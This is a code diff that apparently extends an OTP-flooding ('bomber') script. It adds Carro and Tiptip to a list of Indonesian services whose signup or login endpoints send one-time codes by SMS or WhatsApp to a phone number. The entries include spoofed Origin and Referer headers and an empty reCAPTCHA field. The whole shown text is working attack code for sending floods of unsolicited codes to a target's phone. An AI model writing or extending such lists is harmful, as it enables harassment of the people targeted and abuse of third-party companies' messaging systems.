@@ -35,4 +35,6 @@ def _x(ph):
         ("Staigo","https://api.staigo.id/api/v2/auth/login",{"Content-Type":"application/json","Origin":"https://staigo.id","Referer":"https://staigo.id/login"},{"identifier":_f62(ph)}),
         ("1itmedia","https://api.1itmedia.co.id/oauth/fa_otp",{"Content-Type":"application/x-www-form-urlencoded"},{"username":_f08(ph),"otp_type":"null","is_form":True}),
         ("TirtaSiak","https://apiwa.tirtasiakpekanbaru.co.id/siak/generateotp",{"Content-Type":"application/json","Accept":"application/json"},{"telp":_fplus(ph),"id_pt":1,"message":"*Kode OTP*\n\nKode OTP masuk Anda : ??? (berlaku 5 Menit )\nJangan memberikan kode OTP ke pihak lain, karena bersifat rahasia\nJika anda tidak melakukan aktifitas masuk ke Aplikasi *Perumdam Tirta Siak*\nAbaikan Kode OTP ini.\n\nTerimakasih telah menggunakan Aplikasi *Perumdam Tirta Siak*"}),
-         ]
+        ("Carro","https://carro.co/_actions/requestOtp",{"Content-Type":"application/json","Accept":"application/json"},{"countryCode":"id","locale":"id","mobileNumber":_fplus(ph),"provider":"whatsapp","recaptchaResponse":"","recaptchaAction":"id_idid_requestOtp"}),
+        ("Tiptip","https://api.tiptip.id/authentication/guest/v1/phone/otp/send",{"Content-Type":"application/json","Accept":"application/json","Origin":"https://tiptip.id","Referer":"https://tiptip.id/sign-up","Channel":"WEB","Channel-App-Version":"2.27.31","Channel-Device":"Chrome","Country-Code":"ID","Language":"id"},{"action":"SIGN_UP","delivery_method":"WA","phone_number":_fplus(ph)}),
+    ]
